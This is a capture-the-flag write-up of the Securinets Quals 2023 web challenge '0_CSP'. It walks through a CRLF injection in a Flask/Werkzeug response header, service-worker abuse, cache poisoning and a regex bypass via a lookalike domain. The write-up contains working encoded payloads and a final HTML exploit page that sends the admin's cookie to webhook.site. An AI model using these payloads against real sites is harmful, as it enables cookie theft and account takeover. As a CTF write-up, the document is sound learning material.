---
title: 0_CSP - Securinets-Quals 2023
date: 2023-08-07 23:52:43
author: Lu513n
author_url: https://twitter.com/Lu513n
categories:
  - Web
tags:
  - Securinets-Quals
  - CRLF
  - XSS
  - Cache-Poison
---

**tl;dr**

+ CRLF Injection in Headed Key in Werkzeug `headers.set`
+ Using CRLF Injection at `/?user=` to Get XSS at `/helloworld`
+ Make the admin visit `/?user=<PAYLOAD>` and `/helloworld` using cache poison or bug in regex(uninteded)

<!--more-->

**Challenge Points**: 484
**No. of solves**: 11
**Solved by**: [Lu513n](https://twitter.com/Lu513n)

## Initial Analysis

We are given just an `app.py` and a challenge [link](https://escape.nzeros.me/). In the description, It's given `Flag in admin cookie... Good luck!`

There is an admin bot and also the flag is in the cookie. So it is obvious that we need an [XSS](https://portswigger.net/web-security/cross-site-scripting).

If we look at the [app.py](app.py)

We can see there are 3 endpoints. One is `/reporturl` where we can send the URL for the admin to visit.
```py
def use_regex(input_text):
    pattern = re.compile(r"https://escape.nzeros.me/", re.IGNORECASE)
    return pattern.match(input_text)

@app.route('/reporturl', methods=['POST', 'OPTIONS'])
def report():
  if request.method == "OPTIONS":
      return '', 200, headers
  if request.method == "POST":
      link = request.form['link']
      if not use_regex(link):
          return "wrong url format", 200, headers

      obj = {'url': link}
      # send to bot
      x = requests.post(url, json=obj)
      if (x.content == b'OK'):
          return "success!", 200, headers

  return "failed to visit", 200, headers
```

Another one is `/GetToken` where they take a userid which is a string and check for an existing token for the user. If a token is not present for the user, the token is generated. Then both the userid and token are sent in a JSON.

```py
def generate_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
@app.route('/GetToken', methods=['GET', 'OPTIONS'])
def get_token():
  if request.method == "OPTIONS":
      return '', 200, headers
  try:
      new_header: dict[str, str | bytes] = dict(headers)
      userid = request.args.get("userid")
      if not userid:
          return jsonify({'error': 'Missing userid'}), 400, headers
      if userid in user_tokens:
          token = user_tokens[userid]
      else:
          token = generate_token()
          user_tokens[userid] = token
      new_header["Auth-Token-" +
                 userid] = token
      return jsonify({'token': token, 'user': str(escape(userid))[:110]}), 200, new_header
  except Exception as e:
      return jsonify({'error': f'Something went wrong {e}'}), 500, headers
```

and the third one is `/securinets` where they just check the header and check if the token exists and if it does returns a welcome message.

```py
@app.route('/securinets', methods=['GET', 'OPTIONS'])
def securinets():
  if request.method == "OPTIONS":
      return "", 200, headers
  token = None
  for key, value in request.headers.items():
      if 'Auth-Token-' in key:
          token_name = key[len('Auth-Token-'):]
          token = request.headers.get('Auth-Token-'+token_name)
  if not token:
      return jsonify({'error': 'Missing Auth-Token header', }), 401, headers
  if token in user_tokens.values():
      return jsonify({'message': f'Welcome to Securinets. {token_name}'}), 200, headers
  else:
      return jsonify({'error': 'Invalid token or user not found'}), 403, headers
```

All these endpoints return JSON, so this is not the backend of the site given in the description. If we visit that site, we will be greeted by this webpage

![Site](site.png)

On that site, there are two endpoints `/securinets` and `/helloworld`.

## Further Recon

If we look at the source of the pages `/securinets` and `/helloworld` we can see that they are communicating with the other site through fetch.

Source of `/securinets`:

```html
<script>
    const endpointUrl = 'https://testnos.e-health.software/securinets';
    fetch(endpointUrl)
        .then(response => {
            if (!response.ok) {
                throw new Error(`Network response was not ok: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('Parsed JSON data:', data);
            var paragraphElement = document.createElement('p');
            var text = data['message']
            //purify text
            const clean = DOMPurify.sanitize(text)
            var textNode = document.createTextNode(clean);
            paragraphElement.appendChild(textNode);
            document.body.appendChild(paragraphElement);
        })
        .catch(error => {
            console.error('Fetch error:', error);
        });
</script>
```

In `/securinets` whatever is returned from the `app.py` is added to a text field. So there is no chance for an HTML injection or [XSS](https://portswigger.net/web-security/cross-site-scripting).

Source of `/helloworld`:

```html
<script>
    const endpointUrl = 'https://testnos.e-health.software/GetToken';

    fetch(endpointUrl)
        .then(response => {
            if (!response.ok) {
                throw new Error(`Network response was not ok: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('Parsed JSON data:', data);
            var token = data['token']
            var user = data['user']
            //const clean = DOMPurify.sanitize(user)
            document.body.innerHTML = "hey " + user + " this is your token: " + token
        })
        .catch(error => {
            console.error('Fetch error:', error);
        });

</script>
```

Here we can see that they are getting the data and directly adding to `innerHTML`. Due to this, there is a possibility of [XSS](https://portswigger.net/web-security/cross-site-scripting).  But they are getting it from `/GetToken` and if we check `app.py`:

```py
return jsonify({'token': token, 'user': str(escape(userid))[:110]}), 200, new_header
```

The `userid` returned is HTML escaped and the token is random characters over which we have no control.

Now if we look at the source of `/`. we can see that they are registering a service worker

```html
<script>
  const ServiceWorkerReg = async () => {
    console.log("[ServiceWorkerReg] enter")
    if ('serviceWorker' in navigator) {
      console.log("[ServiceWorkerReg] serviceworker in navigator")
      try {
        const params = new URLSearchParams(window.location.search);
        console.log("[ServiceWorkerReg] registering")

        const reg = await navigator.serviceWorker.register(
          `sw.js?user=${params.get("user") ?? 'stranger'}`,
          {
            scope: './',
          }
        );
        loaded = true;
        console.log("[ServiceWorkerReg] registered")
        console.log(reg)
        if (reg.installing) {
          console.log('Service worker installing');
        } else if (reg.waiting) {
          console.log('Service worker installed');
        } else if (reg.active) {
          console.log('Service worker active');
        }
      } catch (error) {
        console.error(`Registration failed with ${error}`);
      }
    }
    else {
      console.log("browser doesn't support sw")
    }
  };

  console.log("app.js")
  ServiceWorkerReg();
  var loaded;
</script>
```

### What is a service Worker?

Service workers essentially act as proxy servers that sit between web applications, the browser, and the network (when available). They are used to cache different responses and then redeliver them when there is no network connectivity. They are built to enhance the offline experience. 

They also run on a separate thread from the website JavaScript. So they have no access to the DOM.

- [More Info](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)

The service worker's code is available on `/sw.js`. We can check what it does.

It intercepts all the fetch requests and if it is a request to `/GetToken`, it will send to a predefined URL which is generated at the time of registering the worker or and then it will cache it. If it is not to `/GetToken` Service Worker will just cache it.

```js
const params = new URLSearchParams(self.location.search)
const userId = params.get("user")
const serverURL = `https://testnos.e-health.software/GetToken?userid=${userId}`;
/*
.....
*/
self.addEventListener('fetch', (event) => {
  let req = null
  if (event.request.url.endsWith('/GetToken')) {
    req = new Request(serverURL, event.request)
  }

  event.respondWith(
    cacheFirst({
      request: req ?? event.request,
      preloadResponsePromise: event.preloadResponse,
      fallbackUrl: './securinets.png',
    })
  );
});
```

## CRLF Injection

> CRLF-Injection: In HTTP request everything from headers and body is separated using `\r\n`. So if we can include that in headers, we can split the headers and create a new header or even end the headers and write the response body directly. - [More Info](https://www.acunetix.com/websitesecurity/crlf-injection/)

If we look in the `app.py`, we can see that they send back headers with every request. But in `/GetToken` we have some control over the header.

```py
@app.route('/GetToken', methods=['GET', 'OPTIONS'])
def get_token():
  if request.method == "OPTIONS":
      return '', 200, headers
  try:
      new_header: dict[str, str | bytes] = dict(headers)
      userid = request.args.get("userid")
      if not userid:
          return jsonify({'error': 'Missing userid'}), 400, headers
      if userid in user_tokens:
          token = user_tokens[userid]
      else:
          token = generate_token()
          user_tokens[userid] = token
      new_header["Auth-Token-" +
                 userid] = token
      return jsonify({'token': token, 'user': str(escape(userid))[:110]}), 200, new_header
  except Exception as e:
      return jsonify({'error': f'Something went wrong {e}'}), 500, headers
```

Here we can control the header `'Auth-Token-'+userid` as we can control the userid. Also, there is a [CRLF injection](https://www.acunetix.com/websitesecurity/crlf-injection/) in Flask's `headers.set` method and it was previously [reported](https://github.com/pallets/flask/issues/4238) by our teammate. But they told it is not a bug.

Using this we can give `%0d%0aKey:%20Value` in the `userid` and this will send a new header `Key: Value` in the response.
Similarly, we can put 2 `%0d%0a` and we can get whatever we want in the response directly.

![CRLF](crlf.png)

But this is a request to `/GetToken` and will not directly get us XSS. Moreover, we need XSS on `escape.nzeros.me` and this is `testnos.e-health.software`. But using this if we can craft a JSON response, that will be reflected on `escape.nzeros.me`. 

If we look at the JS in `/helloworld` 

```js
document.body.innerHTML = "hey " + user + " this is your token: " + token
```

If we can put the XSS payload in a valid JSON, we will get XSS in `escape.nzeros.me` and can get the cookie.

But what we have got is self-XSS. How will we get XSS on the admin side? If we check the JS, all the fetch requests pass through the service worker.

```js
const reg = await navigator.serviceWorker.register(
  `sw.js?user=${params.get("user") ?? 'stranger'}`,
  {
    scope: './',
  }
); /* Endpoint / - Registering Service Worker */
/*---------------------------------------------------------*/
const params = new URLSearchParams(self.location.search)
const userId = params.get("user")
const serverURL = `https://testnos.e-health.software/GetToken?userid=${userId}`;
/* Endpoint /sw.js - Service worker defining the Server URL*/
/*---------------------------------------------------------*/
self.addEventListener('fetch', (event) => {
  let req = null
  if (event.request.url.endsWith('/GetToken')) {
    req = new Request(serverURL, event.request)
  }
  /*
  .........
  */
});/* Endpoint /sw.js - Service worker Intercepting and Fetching the server URL which is predeined*/
```

So if the admin visits `https://escape.nzeros.me/?user=<PAYLOAD>`, the service worker will be registered with `/sw.js?user=<PAYLOAD>` which means the server URL will be defined as `https://testnos.e-health.software/GetToken?userid=<PAYLOAD>`. So every request which is sent to `/GetToken` will be sent with the PAYLOAD by the service worker.

So we just need to make the admin visit `https://escape.nzeros.me/?user=<PAYLOAD>` and then when the admin visits `/helloworld`, we will get XSS.

But If we use the payload `https://escape.nzeros.me/?user=abcd:%20a%0d%0a%0d%0aArbitrary_Response`, we won't get that text in the response. But else it will be taken as a normal user id.

This is because there are two levels of fetch requests happening in between which will URL decode it further. 

- There is fetch happening when registering sw.js - `sw.js?user=${params.get("user") ?? 'stranger'}`
- There is another fetch happening when the serverURL is defined - `https://testnos.e-health.software/GetToken?userid=${userId}`

So we have to further URL encode it two times for us to get XSS

So the payload for XSS will be
```
https://escape.nzeros.me/?user=strangera:%252520b%25250d%25250aContent-Length:%25252049%25250d%25250a%25250d%25250a%7B%22token%22%3A%22%3Cimg%20src%20onerror%3Dalert%28%29%3E%22%2C%22user%22%3A%22aa%22%7D
```

But for this to work the admin has to visit 2 endpoints. But we can only send one URL and that too, we can't send our site as it is matched with a regex `r"https://escape.nzeros.me/"`.

## The Cache-Poison way

This was an intented way to get make the admin visit the `/helloworld` while XSS is there. If the admin just visits `/helloworld`, the service worker won't be registered and it will only send a request to `/GetToken` without any userid resulting in a `404`.

![helloworld404](helloworld404.png)

If we look at the service worker JS,

```js
const cacheFirst = async ({ request, preloadResponsePromise, fallbackUrl }) => {
  if ((request.url.indexOf('http') === -1)) return;
  const responseFromCache = await caches.match(request);
  if (responseFromCache) {
    return responseFromCache;
  }

  const preloadResponse = await preloadResponsePromise;
  if (preloadResponse) {

    console.info('using preload response', preloadResponse);
    putInCache(request, preloadResponse.clone());
    return preloadResponse;
  }

  try {

    const token = await getToken()
    const responseFromNetwork = await fetchDataWithToken(token, request.clone());
    putInCache(request, responseFromNetwork.clone());
    return responseFromNetwork;

  } catch (error) {
    console.log(error)
    const fallbackResponse = await caches.match(fallbackUrl);
    if (fallbackResponse) {
      return fallbackResponse;
    }
    return new Response('Network error happened', {
      status: 408,
      headers: { 'Content-Type': 'text/plain' },
    });
  }
};
```

The service worker puts all the resources in the cache and if the request is in the cache, the response will also be taken from the cache itself. So we can send the payload request a few times to the admin for it to get cached and then we can send admin to the `/helloworld` endpoint and XSS will trigger.

But we didn't do it this way during the CTF as we had no information that the browser session will persist over different reports. We thought that the browser will be new for each report. So we did it using a bug in the regex.

## The regex way

In the Python code, if you see the regex for the URL we can see that the `.` is not escaped. `.` matches every character in regex so any URL like `https://escapeanzeros.me/` or `https://escapebnzeros.me/` would pass the regex

```py
def use_regex(input_text):
  pattern = re.compile(r"https://escape.nzeros.me/", re.IGNORECASE)
  return pattern.match(input_text)
```

Since there is a GitHub students offer where we can get a `.me` domain for one year for free. We tried to see if any such domain is free. After quite some haggling, we ended up buying `escapebnzero.me` only to realise that we missed an `s` at the end.

![facepalm](https://media.giphy.com/media/WrNfErHio7ZAc/giphy.gif)

Repeat the same process again with another one of our teammates and we end up owning `escapebnzeros.me`. Now we can make the admin visit any website we want.

## Getting the flag

Now we have everything we need for the exploit but the exploit itself. So we tried putting up everything together. We wanted to make the response a valid JSON, we can use this payload for that

```
https://escape.nzeros.me/?user=a:%252520b%25250d%25250a%25250d%25250a%7B%22token%22%3A%22%3Cimg%20src%20onerror%3Dfetch%28%27https%3A%2F%2Fwebhook.site%2F91f29570-a3d7-4288-8143-3daea4f6cc53%25253Fflag%3D%27%25252Bbtoa%28document.cookie%29%29%3E%22%2C%22user%22%3A%22aa%22%7D

Triple URL decoded

https://escape.nzeros.me/?user=a: b\r\n
\r\n
{"token":"<img src onerror=fetch('https://webhook.site/91f29570-a3d7-4288-8143-3daea4f6cc53?flag='+btoa(document.cookie))>","user":"aa"}
```

But this will not be a valid JSON as the token will be appended to it.

![Try1](try1.png)

So we added a `Content-Length` header with the length of content that we want.

```
https://escape.nzeros.me/?user=a:%252520b%25250d%25250aContent-Length:%252520136%25250d%25250a%25250d%25250a%7B%22token%22%3A%22%3Cimg%20src%20onerror%3Dfetch%28%27https%3A%2F%2Fwebhook.site%2F91f29570-a3d7-4288-8143-3daea4f6cc53%25253Fflag%3D%27%25252Bbtoa%28document.cookie%29%29%3E%22%2C%22user%22%3A%22aa%22%7D

Triple URL decoded

https://escape.nzeros.me/?user=a: b\r\n
Content-Length: 136\r\n
\r\n
{"token":"<img src onerror=fetch('https://webhook.site/91f29570-a3d7-4288-8143-3daea4f6cc53?flag='+btoa(document.cookie))>","user":"aa"}
```

The problem with this was that this works only sometimes, and takes up too much time to load all the other time. It works once in a while. So we decide to open up 10 tabs on the admin's end so that in at least one tab it will work. But it also didn't work

This didn't work because the `Content-Length` was fixed to `149`. So when we send content less than that, it will wait for more content. If we can make the content length exactly 149 by changing the payload length, this would've worked. But we only knew this after the CTF.

![Try2](try2.png)

So we thought of using [chunked encoding](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding) instead.

```
https://escape.nzeros.me/?user=a:%252520b%25250d%25250aTransfer-Encoding:%252520chunked%25250d%25250a%25250d%25250a91%25250d%25250a%7B%22token%22%3A%22%3Cimg%20src%20onerror%3Dwindow.location%3D%27https%3A%2F%2Fwebhook.site%2F91f29570-a3d7-4288-8143-3daea4f6cc53%25253Fflag%3D%27%25252Bbtoa%28document.cookie%29%3E%22%2C%22user%22%3A%22aa%22%7D%25250d%25250a0%25250d%25250a%25250d%25250a

Triple URL decoded

https://escape.nzeros.me/?user=a: b\r\n
Transfer-Encoding: chunked\r\n
\r\n
91\r\n
{"token":"<img src onerror=window.location='https://webhook.site/91f29570-a3d7-4288-8143-3daea4f6cc53?flag='+btoa(document.cookie)>","user":"aa"}\r\n
0\r\n
\r\n
```

This worked flawlessly and combined with the script that opens the payload 10 times, we got the flag 10 times.

### Final Payload

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Payload</title>
</head>
<body>
    <img src="https://webhook.site/a995bb24-b7dd-4760-8c17-b69e32e9b9f2?msg=start">
    <iframe id="frame" frameborder="0"></iframe>
    <script>
        const url="https://escape.nzeros.me/?user=strangera:%252520b%25250d%25250aTransfer-Encoding:%252520chunked%25250d%25250a%25250d%25250a91%25250d%25250a%7B%22token%22%3A%22%3Cimg%20src%20onerror%3Dwindow.location%3D%27https%3A%2F%2Fwebhook.site%2F91f29570-a3d7-4288-8143-3daea4f6cc53%25253Fflag%3D%27%25252Bbtoa%28document.cookie%29%3E%22%2C%22user%22%3A%22aa%22%7D%25250d%25250a0%25250d%25250a%25250d%25250a";
        function sleep (time) {
            return new Promise((resolve) => setTimeout(resolve, time));
        }
        (async ()=>{
            w=window.open(url);
            await sleep(1000);
            fetch("https://webhook.site/3f310fc8-1d55-4fbf-83bc-6ac00167ebf1?msg=fetch_after_sleep")
            for (let index = 0; index < 10; index++) {
                window.open("https://escape.nzeros.me/helloworld");
            }
        })()
    </script>
</body>
</html>
```

## Flag

`Securinets{Great_escape_with_Crlf_in_latest_werkzeug_header_key_&&_cache_poison}`
